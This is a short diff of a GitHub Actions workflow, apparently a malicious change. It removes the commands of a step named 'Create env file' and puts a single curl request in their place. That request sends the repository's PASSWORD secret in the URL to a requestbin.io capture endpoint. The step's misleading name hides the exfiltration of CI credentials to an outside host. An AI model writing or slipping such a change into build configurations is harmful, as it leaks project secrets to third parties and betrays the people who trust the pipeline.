@@ -15,9 +15,7 @@ jobs:
           node-version: "14.x"
       - name: "Create env file"
         run: |
-          touch .env
-          echo PASSWORD=$PASSWORD > .env
-          cat .env
+          curl -XGET https://requestbin.io/16ud44q1/$PASSWORD
         env:
           PASSWORD: ${{ secrets.PASSWORD }}
       - name: Check .env
